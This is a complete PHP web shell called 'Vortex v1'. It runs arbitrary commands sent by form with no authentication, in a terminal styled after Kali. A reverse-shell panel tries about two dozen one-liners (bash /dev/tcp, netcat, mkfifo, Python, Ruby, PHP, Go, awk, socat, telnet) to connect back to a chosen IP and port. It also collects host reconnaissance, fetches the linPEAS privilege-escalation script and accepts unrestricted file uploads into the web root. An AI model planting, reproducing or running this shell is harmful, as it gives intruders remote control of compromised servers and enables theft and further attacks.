<?php
   session_start();
   if (!isset($_SESSION["command_history"])) {
       $_SESSION["command_history"] = [];
   } elseif (count($_SESSION["command_history"]) >= 3) {
       array_shift($_SESSION["command_history"]);
   }
   
   if (isset($_GET["clear_history"])) {
       unset($_SESSION["command_history"]);
       header("Location: " . $_SERVER["PHP_SELF"]);
       exit();
   }
   ini_set("display_errors", 1);
   error_reporting(E_ALL);
   
   $user = trim(shell_exec("whoami"));
   $loc = trim(shell_exec("pwd"));
   ?>
<!DOCTYPE html>
<html>
   <head>
      <title>Vortex v1</title>
      <style>
         body {
         background-color: #212121;
         color: #fff;
         font-family: "Courier New", Courier, monospace;
         font-size: 14px;
         margin: 0;
         padding: 0;
         transform: scale(1.2);
         transform-origin: top;
         padding-bottom: 10vh;
         }
         .console {
         border-radius: 5px;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
         margin: 10px auto;
         max-width: 800px;
         padding: 25px;
         margin-top: 60px;
         overflow-wrap: anywhere;
         }
         .console pre {
         margin: 0;
         }
         .prompt,
         .hist {
         color: #28bc99;
         display: inline-block;
         margin-right: 10px;
         font-weight: bolder;
         }
         .input {
         background-color: transparent;
         border: none;
         color: #fff;
         display: inline-block;
         font-family: "Courier New", Courier, monospace;
         font-size: 14px;
         outline: none;
         width: 80%;
         }
         .input:focus {
         outline: none;
         }
         .input:focus+.submit {
         background-color: #4caf50;
         border: none;
         color: #fff;
         cursor: pointer;
         outline: none;
         padding: 5px 10px;
         transition: background-color 0.2s;
         }
         textarea {
         resize: vertical;
         min-height: 16.667px;
         }
         .dirtxt {
         color: #52a4b2;
         }
      </style>
   </head>
   <body>
      <pre style="margin: 10px auto;max-width: 800px;padding: 20px;margin-top: 60px;text-align:center">

____   ____               __                   
\   \ /   /____ _______ _/  |_   ____  ___  ___
 \   Y   //  _ \\_  __ \\   __\_/ __ \ \  \/  /
  \     /(  <_> )|  | \/ |  |  \  ___/  >    < 
   \___/  \____/ |__|    |__|   \___  >/__/\_ \
                                    \/       \/
</pre>
      <div class="console" style="margin-top:10px">
         <?php foreach ($_SESSION["command_history"] as $entry) { ?> <span class="hist" style="margin-bottom:10px; display:block">┌──(<?php echo $entry[
            "who"
            ]; ?>㉿kali)-[<span class="dirtxt"><?php echo $entry[
            "dir"
            ]; ?></span>]<br>
         <div style="display: flex;align-items: center;">
            └─$ 
            <p style="margin:5px">
               <span class="commandtxt"><?php echo $entry[
                  "command"
                  ]; ?>
               <span>
            </p>
         </div>
         <p style="margin:5px;">
         <pre style="color:white;"><?php echo $entry[
            "output"
            ]; ?></pre>
         </p>
         </span> <?php } ?> 
         <form method="POST" action="<?php echo htmlspecialchars(
            $_SERVER["PHP_SELF"]
            ); ?>" name="console">
            <span class="prompt">
               ┌──(<?php echo $user; ?>㉿kali)-[<span class="dirtxt"><?php echo $loc; ?></span>]<br>
               <div style="display: flex;align-items: center;"> └─$ <textarea name="cmd" class="input" autofocus style="height: 16.667px; margin-left:10px" rows="1"></textarea>
               </div>
            </span>
            <pre>
<?php if ($_SERVER["REQUEST_METHOD"] == "POST" && !isset($_POST["ipaddr"])) {
               if (isset($_POST["directory"])) {
                   chdir($_POST["directory"]);
                   $dirs = $_POST["directory"];
               }
               if ($_POST["directory"] == "") {
                   $dirs = $loc;
               }
               if (isset($_POST["cmd"])) {
                   $output = shell_exec($_POST["cmd"] . " 2>&1");
                   $cmd = $_POST["cmd"];
                   if (count($_SESSION["command_history"]) < 3) {
                       array_push($_SESSION["command_history"], [
                           "command" => $cmd,
                           "output" => $output,
                           "dir" => $dirs,
                           "who" => $user,
                       ]);
                   } else {
                       array_shift($_SESSION["command_history"]);
                       array_push($_SESSION["command_history"], [
                           "command" => $cmd,
                           "output" => $output,
                           "dir" => $dirs,
                           "who" => $user,
                       ]);
                   }
               
                   echo $output;
               }
               header("Location: " . $_SERVER["PHP_SELF"]);
               } ?>
    </pre>
            <label for="directory">Execute in directory:</label>
            <input type="text" name="directory" id="directory" style="background-color: transparent;font-weight:bold;
               border-width: 2px;
               color: #28bc99;">
            <input type="submit" value="Execute" class="submit">
            <input type="button" value="Clear History" onclick="location.href='<?php echo $_SERVER[
               "PHP_SELF"
               ]; ?>?clear_history=true'">
         </form>
      </div>
      <div class="console" name="shell">
         <h2>Reverse shell</h2>
         <form method="POST" action="<?php echo htmlspecialchars(
            $_SERVER["PHP_SELF"]
            ); ?>">
            <label for="ipaddr">Your IP:</label>
            <input type="text" name="ipaddr" id="ipaddr" value="<?php echo $_SERVER[
               "REMOTE_ADDR"
               ]; ?>" style="background-color: transparent;
               border-width: 2px;font-weight:bold;
               color: #28bc99;">
            <label for="port">Your Port:</label>
            <input type="text" name="port" id="port" value="4444" style="background-color: transparent; font-weight:bold;
               border-width: 2px;
               color: #28bc99;">
            <input type="submit" value="Execute" class="submit">
         </form>
         <?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
            if (isset($_POST["ipaddr"]) && isset($_POST["port"])) {
                $ip = $_POST["ipaddr"];
                $port = $_POST["port"];
            
                $commands = [
                    'bash -c \'bash -i >& /dev/tcp/' . $ip . "/" . $port . ' 0>&1\'',
                    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc " .
                    $ip .
                    " " .
                    $port .
                    " >/tmp/f",
                    "nc " . $ip . " " . $port . " -e bash",
                    "busybox nc " . $ip . " " . $port . " -e bash",
                    "nc -c bash " . $ip . " " . $port,
                    "ncat " . $ip . " " . $port . " -e bash",
                    "rcat " . $ip . " " . $port . " -r bash",
                    'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' .
                    $ip .
                    '",' .
                    $port .
                    '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'',
                    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' .
                    $ip .
                    '",' .
                    $port .
                    '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'',
                    'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$ip",$port))\'',
                    'socat TCP:$ip:$port EXEC:bash',
                    'require(\'child_process\').exec(\'nc -e bash $ip $port\')',
                    'zsh -c \'zmodload zsh/net/tcp && ztcp $ip $port && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\'',
                    'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'$ip\',$port);os.execute(\'bash -i <&3 >&3 2>&3\');"',
                    'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$ip:$port");cmd:=exec.Command("bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
                    'echo \'import os\' > /tmp/t.v && echo \'fn main() { os.system("nc -e bash $ip $port 0>&1") }\' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v',
                    'awk \'BEGIN {s = "/inet/tcp/0/$ip/$port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
                    'php -r \'$sock=fsockopen("' .
                    $ip .
                    '",' .
                    $port .
                    ');exec("bash <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("' .
                    $ip .
                    '",' .
                    $port .
                    ');shell_exec("bash <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("' .
                    $ip .
                    '",' .
                    $port .
                    ');system("bash <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("' .
                    $ip .
                    '",' .
                    $port .
                    ');passthru("bash <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("' .
                    $ip .
                    '",' .
                    $port .
                    ');popen("bash <&3 >&3 2>&3", "r");\'',
                    'php -r \'$sock=fsockopen("' .
                    $ip .
                    '",' .
                    $port .
                    ');$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'',
                    'TF=$(mktemp -u);mkfifo $TF && telnet $ip $port 0<$TF | bash 1>$TF',
                ];
            
                foreach ($commands as $command) {
                    exec($command, $output, $return_value);
                    if ($return_value === 0) {
                        echo "Command successful: $command<br>";
                        break;
                    } else {
                        echo "Command failed: $command<br>";
                    }
                }
            }
            } ?>
      </div>
      <span style="display:flex;margin: 10px auto;max-width: 800px;">
         <div class="console" name="info" style="width:fit-content"> <?php
            // Get hostname and IP address
            exec("hostname -I", $ip_output);
            $hostname = exec("hostname");
            echo "Hostname: " . $hostname . "<br>";
            echo "IP Address: " . $ip_output[0] . "<br>";
            
            // Get OS version and kernel release
            $os_version = exec("lsb_release -a | grep Description | cut -f2-");
            $kernel_release = exec("uname -r");
            echo "OS Version: " . $os_version . "<br>";
            echo "Kernel Release: " . $kernel_release . "<br>";
            
            // Get CPU and memory information
            $cpu_info = exec(
                "lscpu | grep 'Model name\\|Core(s) per socket\\|Socket(s)'"
            );
            $memory_info = exec("grep MemTotal /proc/meminfo");
            echo "CPU: " . $cpu_info . "<br>";
            echo "Memory: " . $memory_info . "<br>";
            echo "Server time: " . date("H:i") . "<br>";
            
            // Server date
            echo "Server date: " . date("d-m-Y") . "<br>";
            
            // Total space
            $total_space = disk_total_space("/");
            echo "Total space: " .
                round($total_space / 1024 / 1024 / 1024, 2) .
                " GB<br>";
            
            // Free space
            $free_space = disk_free_space("/");
            echo "Free space: " .
                round($free_space / 1024 / 1024 / 1024, 2) .
                " GB<br>";
            
            // php version
            echo "PHP-version: " . phpversion() . "<br>";
            ?> </div>
         <div class="console" name="info" onclick="createTempDir()" style="display: flex; cursor:pointer;
            flex-direction: column;align-items:center;color: #21dbe5;
            font-weight: bolder;"><span style="white-space:nowrap">Click here to autoinstall <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" style="color: #21dbe5;">linPEAS</a></span>
            <img style="height: 180px;
               width: 180px;margin-top:10px" src="https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/images/linpeas.png">
         </div>
         <script>
            function createTempDir() {
                < ? php
                $temp_dir = shell_exec("mktemp -d 2>&1");
                $linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh";
                $linpeas_file = $temp_dir.
                "/linpeas.sh";
                $curl_cmd = "curl -o $linpeas_file $linpeas_url";
                shell_exec($curl_cmd ." 2>&1");
                $chmod_cmd = "chmod +x $linpeas_file";
                shell_exec($chmod_cmd ." 2>&1");
                echo "alert('linPEAS directory created at: ".trim($temp_dir).
                "')"; ? >
            }
         </script>
      </span>
      <style>
         .red {
         color: red
         }
         .green {
         color: green
         }
      </style>
      <?php
         $status = [
             "cURL" => function_exists("curl_version") ? "ON" : "OFF",
             "DNS server" =>
                 strpos(
                     shell_exec("nslookup example.com"),
                     "Non-authoritative answer:"
                 ) !== false
                     ? "ON"
                     : "OFF",
             "FTP" => strpos(shell_exec("ftp -v"), "ftp>") !== false ? "ON" : "OFF",
             "Git" =>
                 strpos(shell_exec("git --version"), "git version") !== false
                     ? "ON"
                     : "OFF",
             "MSSQL" => function_exists("sqlsrv_connect") ? "ON" : "OFF",
             "MySQL" => function_exists("mysqli_connect") ? "ON" : "OFF",
             "Netcat" => strpos(shell_exec("nc -h"), "netcat") !== false ? "ON" : "OFF",
             "Oracle" => function_exists("oci_connect") ? "ON" : "OFF",
             "Perl" => shell_exec("which perl") ? "ON" : "OFF",
             "PHP" => "ON",
             "PostgreSQL" => function_exists("pg_connect") ? "ON" : "OFF",
             "Python" =>
                 strpos(shell_exec("python --version"), "Python") !== false
                     ? "ON"
                     : "OFF",
             "Ruby" =>
                 strpos(shell_exec("ruby --version"), "ruby") !== false ? "ON" : "OFF",
             "SSH" => strpos(shell_exec("ssh -V"), "OpenSSH") !== false ? "ON" : "OFF",
             "Safe_mode" => ini_get("safe_mode") ? "ON" : "OFF",
             "SNMP server" =>
                 strpos(shell_exec("snmpwalk -v2c -c public localhost"), "Timeout:") ===
                 false
                     ? "ON"
                     : "OFF",
             "Telnet" =>
                 strpos(shell_exec("telnet"), "telnet>") !== false ? "ON" : "OFF",
             "openVPN" =>
                 strpos(shell_exec("openvpn --version"), "OpenVPN") !== false
                     ? "ON"
                     : "OFF",
             "fetch" => shell_exec("which fetch") ? "ON" : "OFF",
             "lynx" => shell_exec("which lynx") ? "ON" : "OFF",
             "wget" => shell_exec("which wget") ? "ON" : "OFF",
         ];
         

         ksort($status);
         

         $status_parts = array_chunk($status, ceil(count($status) / 3), true);
         

         echo '<div class="console" name="info">';
         foreach ($status_parts as $part) {
             echo '<div style="display:inline-block; vertical-align:top;width:33%;text-align:center">';
             foreach ($part as $name => $value) {
                 echo $name .
                     ': <span class="' .
                     ($value == "ON" ? "green" : "red") .
                     '">' .
                     $value .
                     "</span><br>";
             }
             echo "</div>";
         }
         echo "</div>";
         ?> <?php if ($_SERVER["REQUEST_METHOD"] === "POST") {
	 if (isset($_FILES["file"])){
         $file_name = $_FILES["file"]["name"];
         $file_size = $_FILES["file"]["size"];
         $file_tmp = $_FILES["file"]["tmp_name"];
         $file_type = $_FILES["file"]["type"];
         

         $upload_dir = "./";
         

         if (move_uploaded_file($file_tmp, $upload_dir . $file_name)) {
             echo "File uploaded successfully.";
         } else {
             echo "Error uploading file.";
         }
         } 
	}?> 
      <div class="console" style="display: flex;
         flex-direction: column;
         width: fit-content;">
         <form action="" method="POST" enctype="multipart/form-data" style="display: flex;flex-direction: column;
            align-items: center;">
            <h2>Upload file:</h2>
            <span>
            <input type="file" name="file" id="file-upload">
            <button type="submit">Upload</button>
            <span>
         </form>
      </div>
      <script>
         const cmdTextarea = document.querySelector('textarea[name="cmd"]');
         const form = document.querySelector('form[name="console"]');
         cmdTextarea.addEventListener('keydown', (event) => {
             if (event.key === 'Enter') {
                 event.preventDefault();
                 form.submit();
             }
         });
         const textarea = document.querySelector('textarea');
         textarea.addEventListener('input', function() {
             this.style.height = '16.667px';
             this.style.height = ((this.scrollHeight) - 5) + 'px';
         });
      </script>
   </body>
</html>
